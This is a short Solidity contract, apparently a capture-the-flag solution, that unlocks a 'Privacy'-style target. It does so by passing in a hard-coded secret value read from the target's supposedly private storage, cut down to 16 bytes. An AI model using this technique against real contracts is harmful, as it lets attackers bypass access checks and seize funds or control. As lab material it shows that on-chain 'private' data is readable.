// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPrivacy {
    function unlock(bytes16 _key) external;
}

contract StorageReader22 {
    IPrivacy public target;

    constructor(address _target) {
        target = IPrivacy(_target);
    }

    function attack() public {
        bytes32 data2 = 0xa21f6042cb1f0510d18f5a0b890f9fb0a742c3ed745366dcdd488443bb529c98;
        bytes16 key = bytes16(data2);
        target.unlock(key);
    }
}
